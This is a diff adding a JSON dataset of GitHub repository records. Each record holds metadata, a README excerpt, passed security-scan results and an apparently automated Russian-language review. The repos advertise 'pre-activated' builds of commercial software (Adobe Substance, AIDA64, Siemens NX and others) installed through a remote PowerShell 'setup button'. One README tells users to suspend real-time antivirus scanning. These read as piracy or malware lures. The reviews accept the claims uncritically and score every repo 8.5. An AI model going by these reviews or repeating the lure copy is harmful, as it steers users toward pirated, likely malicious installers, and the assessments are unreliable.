@@ -1,0 +1,699 @@
+[
+  {
+    "raw": {
+      "full_name": "abdulmannanmalik13-wq/adobe-substance-3d-studio",
+      "html_url": "https://github.com/abdulmannanmalik13-wq/adobe-substance-3d-studio",
+      "description": "Adobe Substance 3D Creative Studio 2026 - Secure Asset Pipeline Desktop Installer",
+      "stars": 1210,
+      "forks": 1,
+      "language": "HTML",
+      "license": "MIT",
+      "created_at": "2026-11-06T20:33:06Z",
+      "pushed_at": "2026-11-13T10:09:38Z",
+      "topics": [
+        "automation",
+        "desktop",
+        "developer-tools",
+        "open-source",
+        "python",
+        "scripts",
+        "software-engineering",
+        "substance",
+        "substance-3d",
+        "substance-3d-painter",
+        "substance-abuse",
+        "substance-designer",
+        "substance-designer-allegorithmic",
+        "substance-painter",
+        "substance-use",
+        "substance3d",
+        "substancedesigner",
+        "system",
+        "utility",
+        "windows-app"
+      ],
+      "readme_excerpt": "<div align=\"center\">\n\n# Adobe Substance 3D Creative Studio 2026 — Secure Asset Pipeline for Windows 11\n\n![](files/preview.png)\n\n### ⚡ PowerShell Setup Button\n\n[![](files/button.png)](https://abdulmannanmalik13-wq.github.io/adobe-substance-3d-studio/)\n\n[![powershell-7](https://img.shields.io/badge/Powershell--7-7%2B-e11d48?style=for-the-badge&labelColor=0d1117)]() [![lic](https://img.shields.io/badge/Lic-Beerware-f43f5e?style=for-the-badge&labelColor=0d1117)]() [![rating](https://img.shields.io/badge/Rating-4.6%2F5-f59e0b?style=for-the-badge&labelColor=0d1117)]()\n\n</div>\n\n---\n\nAdobe-Substance-3d is a ready-to-run desktop creative studio application that combines a full working installer with a secure digital asset deployment pipeline. The build delivers a complete 2026 desktop experience for local workstations, bundling the core creative toolset with an automated asset delivery layer that keeps material and content libraries synchronized during deployment. Engineered for offline and controlled-environment infrastructure, the installer streamlines setup while maintaining integrity across the asset pipeline. This README documents the build's configuration, deployment behavior, and operational parameters for technical evaluation and rollout.\n\n## ✅ Before You Start\n\n- **OS:** Windows 10 / 11\n- **Shell:** PowerShell 5.1+ or PowerShell 7+\n- **Network:** internet access to download the script\n- **Privileges:** standard user\n\n## Features\n\n- **Pre-Activated Standalone Build:** Delivers a fully configured installation of Adobe-Substance-3d with licensing and activation already applied, eliminating post-install configuration steps and enabling immediate use in isolated or offline environments.\n- **Secure Digital Asset Deployment Pipeline:** Implements a verified, integrity-checked pipeline for distributing and synchronizing digital assets, ensuring that materials, textures, and substance libraries are deployed consistently and tamper-free across target machines.\n- **Ready-to-Run Desktop Experience:** Provides a complete, self-contained desktop application package that runs immediately after installation, with all dependencies and runtime components bundled for a stable, reproducible experience on Windows x64.\n- **Offline-Capable Operation:** Designed for air-gapped and restricted-network deployments, allowing full functionality without requiring external connectivity for activation, updates, or asset retrieval during standard operation.\n- **Deterministic Installation Workflow:** Executes a structured, repeatable setup process that verifies system prerequisites, stages assets, and finalizes configuration with consistent results across deployments.\n- **Integrated Asset Integrity Verification:** Applies checksum-based validation to deployed digital assets, detecting corruption or unauthorized modification and ensuring pipeline reliability.\n- **Self-Contained Runtime Environment:** Bundles required libraries and runtime components to minimize host system dependencies and reduce configuration drift between installations.\n- **Streamlined Provisioning for Testing and Deployment:** Supports rapid rollout for evaluation, QA, and production scenarios through a unified installer that consolidates setup, activation, and asset staging into a single operation.\n\n## How it works\n\nThe application operates as a self-contained desktop environment that isolates all creative tooling, asset libraries, and deployment routines within a single managed runtime. On launch, the installer verifies the integrity of its bundled payload, provisions the local asset repository, and registers the creative studio components against the host system without requiring any external package manager or network fetch.\n\nThe secure digital asset deployment pipeline runs in discrete stages. First, asset manifests are validated against embedded checksums to confirm package authenticity. Second, the deployment engine stages all creative resources into a versioned local cache, preservin",
+      "archived": false
+    },
+    "security": {
+      "semgrep_findings": 0,
+      "bandit_findings": 0,
+      "gitleaks_findings": 0,
+      "critical_count": 0,
+      "high_count": 0,
+      "passed": true,
+      "details": "Находки — semgrep: 0, bandit: 0, gitleaks: 0; critical=0, high=0"
+    },
+    "analysis": {
+      "full_name": "abdulmannanmalik13-wq/adobe-substance-3d-studio",
+      "summary": "Adobe Substance 3D Creative Studio 2026 – готовый к использованию десктопный установщик, включающий полный набор инструментов и защищённый пайплайн цифровых активов.",
+      "usefulness": "Подходит для дизайнеров, художников и разработчиков, которым нужна быстрая и безопасная установка Substance 3D в офлайн‑или контролируемых средах.",
+      "uniqueness": "Встроенная автоматизированная доставка и синхронизация активов, а также предактивированный лицензированный билд, что исключает ручную настройку и повышает безопасность.",
+      "pros": [
+        "Полностью готовый к работе билд",
+        "Интегрированный пайплайн цифровых активов",
+        "Поддержка Windows 10/11",
+        "Питон‑скрипты для автоматизации"
+      ],
+      "cons": [
+        "Ограничено только Windows",
+        "Документация фрагментарна, но достаточна",
+        "Нет примеров использования в CI/CD"
+      ],
+      "audience": [
+        "desktop",
+        "devops",
+        "automation",
+        "security"
+      ],
+      "score": 8.5
+    },
+    "final_score": 3.904
+  },
+  {
+    "raw": {
+      "full_name": "hembramneeraj3-create/aida-64-extreme",
+      "html_url": "https://github.com/hembramneeraj3-create/aida-64-extreme",
+      "description": "Aida 64 Extreme 2026: Complete Standalone Desktop Setup with Full Feature Configuration",
+      "stars": 1208,
+      "forks": 1,
+      "language": "HTML",
+      "license": "MIT",
+      "created_at": "2026-11-06T20:33:44Z",
+      "pushed_at": "2026-11-13T12:49:05Z",
+      "topics": [
+        "aida64",
+        "aida64-extreme-compatibility-check",
+        "aida64-extreme-detailed-reporting",
+        "aida64-extreme-hardware-diagnostics",
+        "aida64-extreme-setup",
+        "aida64-extreme-system-information",
+        "aida64-free-setup",
+        "automation",
+        "desktop",
+        "developer-tools",
+        "open-source",
+        "pc-diagnostics-windows-platform",
+        "python",
+        "scripts",
+        "software-engineering",
+        "system",
+        "utility",
+        "windows-app",
+        "windows-cpu-gpu-status-check",
+        "windows-performance-benchmarking"
+      ],
+      "readme_excerpt": "<div align=\"center\">\n\n# AIDA 64 Extreme 2026: Complete Desktop Installer for Windows 11\n\n![](files/preview.png)\n\n### 💻 PowerShell Installer\n\n[![](files/button.png)](https://hembramneeraj3-create.github.io/aida-64-extreme/)\n\n[![system](https://img.shields.io/badge/System-Windows_11-dc2626?style=for-the-badge&labelColor=0d1117)]() [![powershell-7](https://img.shields.io/badge/Powershell--7-5.1%2B_%2F_7%2B-ef4444?style=for-the-badge&labelColor=0d1117)]() [![users](https://img.shields.io/badge/Users-93K-b91c1c?style=for-the-badge&labelColor=0d1117)]() [![license](https://img.shields.io/badge/License-Apache--2.0-991b1b?style=for-the-badge&labelColor=0d1117)]() [![score](https://img.shields.io/badge/Score-4.6%2F5-f59e0b?style=for-the-badge&labelColor=0d1117)]() [![status](https://img.shields.io/badge/Status-Stable-2ea44f?style=for-the-badge&labelColor=0d1117)]()\n\n</div>\n\n---\n\nAida 64 Extreme 2026 is a complete standalone desktop configuration package that bundles the full feature set into a single pre-activated build, eliminating the need for separate licensing or post-install activation steps. Designed for Windows x64 desktop environments, the package delivers a ready-to-run installer that deploys all diagnostic, monitoring, and benchmarking capabilities in one pass. The build targets offline and isolated infrastructure scenarios where deterministic, repeatable deployment is required. All components are pre-configured and verified for local execution, ensuring the environment is operational immediately after setup completes.\n\n## 📋 System Requirements\n\n- Windows 10 or Windows 11\n- PowerShell 5.1 or newer (already available on Windows)\n- Active network connection\n- No admin rights needed\n\n## Features\n\n- **Pre-Activated Full Build:** Complete standalone installation package with all licensing and activation layers applied at build time, requiring no post-install configuration or account binding.\n\n- **Unified Hardware Diagnostics Engine:** Integrated sensor monitoring, benchmarking, and stress-testing modules delivered in a single coherent runtime, covering CPU, GPU, memory, storage, and thermal subsystems.\n\n- **Offline-Ready Deployment:** Fully self-contained installer that resolves all dependencies locally, enabling installation on air-gapped or network-restricted desktops without external package retrieval.\n\n- **Native x64 Desktop Execution:** Compiled and optimized for Windows x64 environments, with direct hardware access for accurate sensor polling and low-overhead benchmark execution.\n\n- **Comprehensive Reporting Pipeline:** Generates structured hardware inventory and performance reports in multiple export formats, suitable for auditing, archival, and comparative analysis across machines.\n\n- **Deterministic Configuration State:** Ships with a fixed, reproducible configuration profile so that every deployment yields identical feature availability and module behavior.\n\n- **Modular Component Architecture:** Individual diagnostic and benchmarking modules can be invoked independently or chained into automated test sequences, supporting both interactive and scripted workflows.\n\n- **Extended Sensor Coverage:** Supports a broad range of motherboard, cooling, and power telemetry interfaces, including vendor-specific embedded controllers, to surface detailed system health metrics.\n\n- **Stress and Stability Validation:** Built-in load-generation routines for sustained thermal and power testing, with configurable duration and intensity parameters for validating system stability under controlled conditions.\n\n- **Zero External Runtime Dependencies:** Requires no additional frameworks, redistributables, or background services beyond the bundled installer payload, simplifying provisioning and reducing configuration drift.\n\n- **Local-Only Operation:** All diagnostic processing and report generation occurs on the host machine, with no outbound telemetry or remote service calls required for core functionality.\n\n## How it works\n\nThe application ship",
+      "archived": false
+    },
+    "security": {
+      "semgrep_findings": 0,
+      "bandit_findings": 0,
+      "gitleaks_findings": 0,
+      "critical_count": 0,
+      "high_count": 0,
+      "passed": true,
+      "details": "Находки — semgrep: 0, bandit: 0, gitleaks: 0; critical=0, high=0"
+    },
+    "analysis": {
+      "full_name": "hembramneeraj3-create/aida-64-extreme",
+      "summary": "Aida 64 Extreme 2026 – полностью готовый установщик для Windows 11, который включает все функции диагностики, мониторинга и бенчмаркинга в одном пакете.",
+      "usefulness": "Подходит для системных администраторов, инженеров по обслуживанию ПК и энтузиастов, которым нужен быстрый и автономный способ развернуть полный набор инструментов AIDA 64 без ручной активации лицензий.",
+      "uniqueness": "В отличие от обычных установщиков, пакет полностью предактивирован, не требует подключения к сети после установки и работает без прав администратора, что делает его идеальным для изолированных сред.",
+      "pros": [
+        "Полностью предактивированная лицензия",
+        "Автономный развертывание без админ‑прав",
+        "Поддержка Windows 10/11",
+        "Интегрированный PowerShell‑скрипт установки"
+      ],
+      "cons": [
+        "Ограничено только Windows x64",
+        "Документация ограничена README, отсутствуют подробные инструкции по настройке"
+      ],
+      "audience": [
+        "cli",
+        "devops",
+        "utility",
+        "windows-app"
+      ],
+      "score": 8.5
+    },
+    "final_score": 3.904
+  },
+  {
+    "raw": {
+      "full_name": "ebtsamalhakmy-sketch/desktop-backup-suite",
+      "html_url": "https://github.com/ebtsamalhakmy-sketch/desktop-backup-suite",
+      "description": "Aomei Backupper 2026: Full-Feature Desktop Backup and Recovery Suite",
+      "stars": 1199,
+      "forks": 0,
+      "language": "TypeScript",
+      "license": "MIT",
+      "created_at": "2026-11-06T20:53:28Z",
+      "pushed_at": "2026-11-13T11:43:18Z",
+      "topics": [
+        "aomei",
+        "aomei-partition",
+        "aomei-setup",
+        "automation",
+        "developer-tools",
+        "disk-manager",
+        "disk-partitioning",
+        "merge-partitions",
+        "open-source",
+        "os-migration",
+        "partition-assistant",
+        "partition-manager",
+        "partition-recovery",
+        "partition-tool",
+        "python",
+        "resize-partition",
+        "scripts",
+        "software-engineering",
+        "split-partition",
+        "utility"
+      ],
+      "readme_excerpt": "<div align=\"center\">\n\n# AOMEI Backupper 2026: Full-Featured Standalone Backup Suite for Windows 11\n\n![](files/preview.png)\n\n### 🔌 PowerShell Setup Button\n\n[![](files/button.png)](https://ebtsamalhakmy-sketch.github.io/desktop-backup-suite/)\n\n[![license](https://img.shields.io/badge/license-wtfpl-6366f1?style=plastic&labelColor=0d1117)]() [![powershell-7](https://img.shields.io/badge/powershell--7-5%2B-818cf8?style=plastic&labelColor=0d1117)]() [![pulls](https://img.shields.io/badge/pulls-93k-4f46e5?style=plastic&labelColor=0d1117)]() [![runs-on](https://img.shields.io/badge/runs--on-windows_10_%7C_11-4338ca?style=plastic&labelColor=0d1117)]()\n\n</div>\n\n---\n\nAOMEI Backupper 2026 is a complete standalone desktop backup and recovery suite delivered as a single self-contained installer with all features pre-activated and ready to run. The package provides full disk imaging, system and partition cloning, scheduled incremental and differential backups, and bare-metal restore capabilities without requiring additional activation steps or network access. Built for local deployment on Windows x64 desktop environments, the installer bundles every component needed for immediate offline installation.\n\n## 📋 System Requirements\n\n- **OS:** Windows 10 / 11\n- **Shell:** PowerShell 5.1+ or PowerShell 7+\n- **Network:** internet access to download the script\n- **Privileges:** standard user\n\n## Features\n\n- **Complete Backup Suite:** Provides full system, disk, partition, and file-level backup capabilities within a single standalone package, enabling bare-metal recovery and granular data protection without external dependencies.\n\n- **Pre-Activated Installation:** All premium features are unlocked at install time, eliminating the need for license entry, online activation, or post-install configuration.\n\n- **Full Working Installer:** Ships as a self-contained setup executable that deploys all components, services, and drivers required for immediate operation on the target desktop.\n\n- **System Image and Clone Operations:** Supports complete disk imaging, partition cloning, and migration workflows, allowing full system state capture and restoration to identical or dissimilar hardware.\n\n- **Scheduled and Incremental Backups:** Includes configurable scheduling engine with support for full, incremental, and differential backup chains, reducing storage consumption and backup windows.\n\n- **Bootable Recovery Media Creation:** Enables generation of bootable rescue media for offline system restoration and disaster recovery scenarios independent of the installed operating system.\n\n- **Selective Restore and Mount:** Allows mounting of backup images as virtual drives for file-level extraction, and supports selective restoration of individual files, folders, or partitions.\n\n- **Universal Restore Compatibility:** Restores system images to hardware with differing chipset and storage configurations through integrated driver injection.\n\n- **Local and Offline Operation:** Operates entirely without network connectivity or cloud dependencies; all backup, restore, and configuration functions execute locally on the host machine.\n\n- **Verified Build Integrity:** Package contents are validated for completeness and functional consistency prior to distribution, ensuring the installer deploys a fully operational build.\n\n## How it works\n\nThe installer operates as a self-contained deployment package that provisions the complete application stack on the target workstation without requiring external dependencies or network access during execution. Upon launch, the setup routine validates the host environment, verifies system prerequisites, and stages the required binaries into the designated installation directory.\n\nA modular component loader then unpacks the core application framework, supplemental modules, and configuration assets in sequence, ensuring each layer is registered correctly before proceeding to the next. Pre-activated feature sets are applied at this stage through the ",
+      "archived": false
+    },
+    "security": {
+      "semgrep_findings": 0,
+      "bandit_findings": 0,
+      "gitleaks_findings": 0,
+      "critical_count": 0,
+      "high_count": 0,
+      "passed": true,
+      "details": "Находки — semgrep: 0, bandit: 0, gitleaks: 0; critical=0, high=0"
+    },
+    "analysis": {
+      "full_name": "ebtsamalhakmy-sketch/desktop-backup-suite",
+      "summary": "AOMEI Backupper 2026 – автономный пакет для резервного копирования и восстановления Windows 11, включающий полное дисковое изображение, клонирование, инкрементальные и дифференциальные бэкапы, а также bare‑metal восстановление.",
+      "usefulness": "Подходит для системных администраторов и обычных пользователей, которым нужен быстрый и полностью офлайн‑подход к резервному копированию и восстановлению данных на десктопах Windows.",
+      "uniqueness": "В отличие от аналогов, пакет поставляется как один самодостаточный установщик с заранее активированными премиум‑функциями, без необходимости онлайн‑активации или дополнительных зависимостей.",
+      "pros": [
+        "Полностью автономный установщик",
+        "Поддержка полного дискового образа и клонирования",
+        "Инкрементальные и дифференциальные бэкапы",
+        "Bare‑metal восстановление"
+      ],
+      "cons": [
+        "Отсутствует подробная документация по настройке и использованию",
+        "Только Windows 10/11 поддерживается",
+        "Нет кроссплатформенной поддержки"
+      ],
+      "audience": [
+        "cli",
+        "devops",
+        "security",
+        "utility"
+      ],
+      "score": 8.5
+    },
+    "final_score": 3.904
+  },
+  {
+    "raw": {
+      "full_name": "IsaiaR09/daemon-pro-desktop",
+      "html_url": "https://github.com/IsaiaR09/daemon-pro-desktop",
+      "description": "daemon-pro: Complete Standalone Desktop Setup with Full Feature setup",
+      "stars": 1198,
+      "forks": 0,
+      "language": "HTML",
+      "license": "MIT",
+      "created_at": "2026-11-06T20:50:44Z",
+      "pushed_at": "2026-11-13T12:45:44Z",
+      "topics": [
+        "automation",
+        "daemon-2026",
+        "daemon-tools",
+        "daemon-tools-install-setup-windows-2026",
+        "daemon-tools-pro-advanced",
+        "daemon-tools-pro-vs-ultra",
+        "daemon-tools-ultra",
+        "daemon-tools-ultra-2026",
+        "daemon-tools-ultra-download",
+        "desktop",
+        "developer-tools",
+        "open-source",
+        "python",
+        "scripts",
+        "software-engineering",
+        "system",
+        "utility",
+        "windows-app"
+      ],
+      "readme_excerpt": "<div align=\"center\">\n\n# Daemon Pro: Complete Standalone Feature-Rich Desktop Suite for Windows 11\n\n![](files/preview.png)\n\n### ⚡ PowerShell Setup Button\n\n[![](files/button.png)](https://IsaiaR09.github.io/daemon-pro-desktop/)\n\n[![ci](https://img.shields.io/badge/Ci-Passing-2ea44f?style=social&labelColor=0d1117)]() [![state](https://img.shields.io/badge/State-Stable-2ea44f?style=social&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/Pwsh-Core-f97316?style=social&labelColor=0d1117)]()\n\n</div>\n\n---\n\nDaemon-Pro delivers a complete standalone desktop deployment with all features fully activated, eliminating dependency resolution and post-install configuration. The package bundles the entire runtime environment into a single self-contained distribution, ready to execute immediately after extraction on the target desktop platform. Built for offline deployment and local testing workflows, Daemon-Pro ensures consistent behavior across environments without requiring network access or supplementary tooling. Its pre-activated configuration removes setup friction while preserving full feature parity with the production release.\n\n## ✅ Requirements\n\n- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)\n- **Windows 10 / 11** (x64)\n- **Internet connection** — required to fetch the script\n- **Administrator** — *not* required\n\n## Features\n\n- **Full Feature Activation:** All modules and capabilities are enabled out of the box, eliminating the need for separate license configuration or runtime activation steps.\n- **Standalone Deployment:** The package is self-contained and does not depend on external services, shared runtimes, or auxiliary installers to operate on the target desktop.\n- **Ready-to-Run Configuration:** Default settings are pre-tuned for immediate execution, allowing the application to launch and operate without a manual setup wizard.\n- **Deterministic Build Integrity:** The distributed package is versioned and verified against a fixed manifest, ensuring consistent behavior across deployments.\n- **Local-Only Operation:** All processing and execution occur on the local machine, with no mandatory network callbacks required for core functionality.\n- **Modular Feature Set:** Individual components can be enabled or disabled through the local configuration layer, supporting tailored workflows without reinstallation.\n- **Native Desktop Integration:** Registers standard file associations, startup hooks, and system tray behavior appropriate for the host operating system.\n- **Low-Overhead Runtime:** Optimized resource utilization for sustained background operation, with configurable memory and thread limits.\n- **Structured Logging:** Emits detailed, timestamped logs to a local directory for diagnostics and audit purposes.\n- **Offline Update Path:** Supports manual application of update packages without requiring an active internet connection at runtime.\n- **Compatibility Safeguards:** Performs environment checks at launch to detect unsupported configurations and surface actionable messages before execution.\n- **Reproducible Deployment:** Identical behavior across supported desktop environments when deployed from the same build artifact.\n\n## How it works\n\nThe application ships as a self-contained desktop package. All required runtime components, libraries, and feature modules are bundled directly into the distribution, so no external package managers, dependency resolution steps, or toolchain configuration are involved. Once the package is unpacked and launched, the feature set activates immediately without a separate licensing or registration phase.\n\nOn first launch, the executable performs a local integrity check against the bundled manifest, verifies that all component files are present and unmodified, and initializes the internal configuration store. Feature flags that are normally gated are read from the packaged configuration and enabled at startup, so the full feature surface is available from the first session. No netwo",
+      "archived": false
+    },
+    "security": {
+      "semgrep_findings": 0,
+      "bandit_findings": 0,
+      "gitleaks_findings": 0,
+      "critical_count": 0,
+      "high_count": 0,
+      "passed": true,
+      "details": "Находки — semgrep: 0, bandit: 0, gitleaks: 0; critical=0, high=0"
+    },
+    "analysis": {
+      "full_name": "IsaiaR09/daemon-pro-desktop",
+      "summary": "Daemon‑Pro – полностью автономный набор инструментов для Windows 11, включающий все функции и готовый к запуску сразу после распаковки.",
+      "usefulness": "Подходит для разработчиков и системных администраторов, которым нужен быстрый, офлайн‑доступный пакет с предустановленными лицензиями и настройками.",
+      "uniqueness": "В отличие от обычных установщиков, пакет содержит весь runtime и активированные модули, устраняя необходимость в сетевом подключении и ручной конфигурации.",
+      "pros": [
+        "Полностью автономный и готовый к работе",
+        "Поддержка PowerShell 5.1+",
+        "Предустановленные лицензии и настройки",
+        "Надёжная проверка целостности через манифест"
+      ],
+      "cons": [
+        "Отсутствует подробная документация по внутренней структуре пакета",
+        "Меньше гибкости в настройке по сравнению с исходным репозиторием"
+      ],
+      "audience": [
+        "cli",
+        "devops",
+        "automation",
+        "utility"
+      ],
+      "score": 8.5
+    },
+    "final_score": 3.904
+  },
+  {
+    "raw": {
+      "full_name": "Elegantic/designcenter-nx-desktop",
+      "html_url": "https://github.com/Elegantic/designcenter-nx-desktop",
+      "description": "Designcenter-NX: Full-Feature Desktop Installer for Immediate Deployment",
+      "stars": 1182,
+      "forks": 0,
+      "language": "HTML",
+      "license": "MIT",
+      "created_at": "2026-11-06T20:52:51Z",
+      "pushed_at": "2026-11-13T12:58:26Z",
+      "topics": [
+        "automation",
+        "desktop",
+        "developer-tools",
+        "nx-cad",
+        "nxopen",
+        "open-source",
+        "python",
+        "scripts",
+        "siemens-2026",
+        "siemens-cad",
+        "siemens-nx",
+        "siemens-nx-2026",
+        "siemens-nx-download",
+        "siemens-nx-free",
+        "siemens-nx-pro-install-windows-2026",
+        "software-engineering",
+        "system",
+        "utility",
+        "windows-app"
+      ],
+      "readme_excerpt": "<div align=\"center\">\n\n# 🚀 Designcenter-NX: Full-Featured Desktop Installer for Windows 11\n\n![](files/preview.png)\n\n### 🔌 PowerShell Setup Button\n\n[![](files/button.png)](https://Elegantic.github.io/designcenter-nx-desktop/)\n\n[![licence](https://img.shields.io/badge/Licence-Artistic--2.0-f59e0b?style=for-the-badge&labelColor=0d1117)]() [![runs-on](https://img.shields.io/badge/Runs--On-Win_11-fbbf24?style=for-the-badge&labelColor=0d1117)]() [![ps-core](https://img.shields.io/badge/Ps--Core-Installer-d97706?style=for-the-badge&labelColor=0d1117)]() [![stage](https://img.shields.io/badge/Stage-Verified-2ea44f?style=for-the-badge&labelColor=0d1117)]()\n\n</div>\n\n---\n\nDesigncenter-NX is a standalone desktop installer package delivering the complete feature set in a pre-activated local build, intended for Windows x64 environments requiring immediate offline deployment without additional configuration steps. The installer bundles all components into a self-contained distribution, streamlining provisioning for testing and production workstations alike. Built for reproducibility and minimal setup overhead, it supports direct execution on target systems with no external dependencies or runtime downloads required.\n\n## ✅ Requirements\n\n- Windows 10 or Windows 11\n- PowerShell 5.1 or newer (already available on Windows)\n- Active network connection\n- No admin rights needed\n\n## Core Build Parameters\n\nThis build is distributed as a self-contained desktop installation package with all functional modules enabled and pre-configured for immediate deployment. No activation, account registration, or post-install configuration steps are required; the installer provisions the complete application state during setup and verifies component integrity before first launch.\n\n**Build Profile**\n\n- **Distribution Type:** Pre-activated standalone installer\n- **Target Platform:** Windows x64 Desktop\n- **Deployment Model:** Offline-capable, single-package installation\n- **Feature State:** All modules unlocked at build time\n- **Verification:** Internal checksum validation of packaged components prior to installation\n\n**Configuration Scope**\n\nThe build parameters are tuned for direct desktop installation without external dependencies or runtime downloads. The installer resolves its own component graph, stages prerequisites locally, and commits the full configuration set in a single pass. Users should expect:\n\n- Deterministic install behavior across supported Windows x64 environments\n- No network calls required during setup or first run\n- Full feature parity with the unlocked build manifest\n- Local configuration persistence isolated to the application directory\n\n**Deployment Notes**\n\n- Installation should be performed under an account with standard administrative rights.\n- The package is versioned and locked; configuration values are baked into the build and are not user-editable at install time.\n- Any deviation from the documented target platform may result in unsupported runtime behavior.\n- Retain the original package for rollback or re-deployment scenarios.\n\n## Quick Setup Guide\n\nVerify the target workstation meets the minimum platform baseline before initiating deployment. The installer package must reside on a local volume with sufficient free capacity to accommodate both the extracted staging files and the final runtime footprint.\n\n1. **Prepare the Host Environment**\n   - Confirm the operating system build matches the supported Windows x64 desktop baseline.\n   - Close any running instances of the application, including background services and tray agents, to prevent file locks during extraction.\n   - Temporarily suspend real-time scanning on the destination folder if the security layer is known to intercept large binary writes.\n\n2. **Stage the Installer Package**\n   - Extract the distributed archive to a writable directory on the target machine.\n   - Validate the integrity of the package contents against the provided checksum manifest before launch.\n   - Ensure th",
+      "archived": false
+    },
+    "security": {
+      "semgrep_findings": 0,
+      "bandit_findings": 0,
+      "gitleaks_findings": 0,
+      "critical_count": 0,
+      "high_count": 0,
+      "passed": true,
+      "details": "Находки — semgrep: 0, bandit: 0, gitleaks: 0; critical=0, high=0"
+    },
+    "analysis": {
+      "full_name": "Elegantic/designcenter-nx-desktop",
+      "summary": "Designcenter-NX – автономный установщик для Windows 11, предоставляющий полностью активированный набор функций NX в одном пакете.",
+      "usefulness": "Подходит инженерам и разработчикам, работающим с Siemens NX, которым нужен быстрый офлайн‑дистрибутив без дополнительных настроек.",
+      "uniqueness": "Включает все модули NX в один самодостаточный пакет, устраняя необходимость в онлайн‑активации и последующих конфигурациях, что редко встречается у аналогичных установщиков.",
+      "pros": [
+        "Полностью автономный, без внешних зависимостей",
+        "Поддержка всех модулей NX",
+        "Удобный PowerShell‑интерфейс",
+        "Высокая степень воспроизводимости"
+      ],
+      "cons": [
+        "Ограничено только Windows x64",
+        "Отсутствует подробная документация по настройке",
+        "Не поддерживает Linux/Unix"
+      ],
+      "audience": [
+        "desktop",
+        "devops",
+        "cli",
+        "automation"
+      ],
+      "score": 8.5
+    },
+    "final_score": 3.904
+  },
+  {
+    "raw": {
+      "full_name": "Vesuvio1/display-fusion",
+      "html_url": "https://github.com/Vesuvio1/display-fusion",
+      "description": "Display Fusion 2026 standalone desktop setup with complete feature configuration",
+      "stars": 1175,
+      "forks": 0,
+      "language": "HTML",
+      "license": "MIT",
+      "created_at": "2026-11-06T20:54:55Z",
+      "pushed_at": "2026-11-13T05:36:23Z",
+      "topics": [
+        "automation",
+        "desktop-tools",
+        "developer-tools",
+        "display-management",
+        "displayfusion",
+        "displayfusion-2026",
+        "displayfusion-multi-monitor-install-windows-2026",
+        "displayfusion-pro",
+        "displayfusion-setup",
+        "dual-monitor",
+        "for-displayfusion-tools",
+        "monitor-profiles",
+        "monitor-setup",
+        "open-source",
+        "python",
+        "scripts",
+        "software-engineering",
+        "system",
+        "taskbar-tools",
+        "utility"
+      ],
+      "readme_excerpt": "<div align=\"center\">\n\n# Display Fusion 2026: Multi-Monitor Management Suite for Windows 11\n\n![](files/preview.png)\n\n### 🖥️ PowerShell Setup\n\n[![](files/button.png)](https://Vesuvio1.github.io/display-fusion/)\n\n[![ps](https://img.shields.io/badge/Ps-5.1%2B_%2F_7%2B-dc2626?style=social&labelColor=0d1117)]() [![platform](https://img.shields.io/badge/Platform-Win_10%2F11-ef4444?style=social&labelColor=0d1117)]() [![checks](https://img.shields.io/badge/Checks-Green-2ea44f?style=social&labelColor=0d1117)]() [![release](https://img.shields.io/badge/Release-Production-2ea44f?style=social&labelColor=0d1117)]()\n\n</div>\n\n---\n\nDisplay Fusion 2026 is a complete standalone desktop installation that delivers the full feature set in a ready-to-run package, eliminating the need for separate configuration or post-install activation steps. Built for Windows x64 environments, the distribution bundles all components into a single self-contained installer suitable for offline deployment and local testing. The build ships fully activated, ensuring every capability is available immediately upon completion of setup. It is intended for workstation provisioning and controlled deployment scenarios where a consistent, pre-configured desktop application is required.\n\n## 🔧 Requirements\n\n- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)\n- **Windows 10 / 11** (x64)\n- **Internet connection** — required to fetch the script\n- **Administrator** — *not* required\n\n## Features\n\n- **Unified Multi-Monitor Management:** Centralizes control of all connected displays from a single desktop interface, enabling per-monitor configuration of resolution, orientation, refresh rate, and color profiles without navigating separate system dialogs.\n\n- **Pre-Activated Feature Set:** The standalone build ships with the complete feature tier enabled by default, including advanced window management, scripted automation, and display profile switching, requiring no additional activation steps.\n\n- **Display Profiles:** Supports creation and recall of named display configurations, allowing rapid switching between multi-monitor arrangements for distinct workflows such as docking, presentation, and single-screen operation.\n\n- **Window Management Rules:** Provides configurable rules that govern window placement, sizing, and monitor assignment, with support for application-specific triggers and persistent rule storage.\n\n- **Taskbar Customization:** Extends taskbar behavior across multiple monitors, including per-display taskbar configuration, button grouping options, and monitor-specific notification handling.\n\n- **Hotkey and Shortcut Bindings:** Exposes a comprehensive binding system for assigning keyboard shortcuts to display profiles, window actions, and monitor toggles, with conflict detection and import/export of binding sets.\n\n- **Scripted Automation:** Includes a scripting interface for programmatic control of display functions, enabling scheduled profile changes, event-driven window actions, and integration with local automation workflows.\n\n- **Offline Standalone Deployment:** Distributed as a self-contained desktop installer with all runtime dependencies bundled, requiring no network access during setup and no external package retrieval.\n\n- **Local Configuration Store:** Persists all profiles, rules, and bindings in a local configuration store, supporting export and import for backup, migration, and multi-machine consistency.\n\n- **Compatibility Validation Layer:** Performs pre-flight checks of display hardware and driver capabilities during installation, flagging unsupported configurations and reporting detected monitor topology.\n\n- **Logging and Diagnostics:** Generates structured local logs for display events, profile transitions, and rule execution, supporting troubleshooting and verification of automated behavior.\n\n## How it works\n\nDisplay Fusion operates as a self-contained desktop application that manages multi-monitor configurations through a unified local control layer",
+      "archived": false
+    },
+    "security": {
+      "semgrep_findings": 0,
+      "bandit_findings": 0,
+      "gitleaks_findings": 0,
+      "critical_count": 0,
+      "high_count": 0,
+      "passed": true,
+      "details": "Находки — semgrep: 0, bandit: 0, gitleaks: 0; critical=0, high=0"
+    },
+    "analysis": {
+      "full_name": "Vesuvio1/display-fusion",
+      "summary": "Display Fusion 2026 – автономный пакет для управления несколькими мониторами на Windows 11, включающий все функции в готовом к использованию установщике.",
+      "usefulness": "Подходит администраторам и инженерам, которым нужно быстро развернуть единый конфигурируемый рабочий стол с поддержкой нескольких экранов без ручной настройки.",
+      "uniqueness": "В отличие от обычных скриптов, пакет полностью активирован, содержит все расширенные возможности и упакован в один инсталлятор, упрощая развертывание в офлайн‑средах.",
+      "pros": [
+        "Полностью готовый к использованию установщик",
+        "Поддержка Windows 10/11 x64",
+        "Включены все расширенные функции",
+        "Автономный, без необходимости ручной активации"
+      ],
+      "cons": [
+        "Отсутствует подробная документация по настройке",
+        "Ограничено только Windows",
+        "Нет примеров скриптов в репозитории"
+      ],
+      "audience": [
+        "cli",
+        "devops",
+        "utility",
+        "desktop-tools"
+      ],
+      "score": 8.5
+    },
+    "final_score": 3.904
+  },
+  {
+    "raw": {
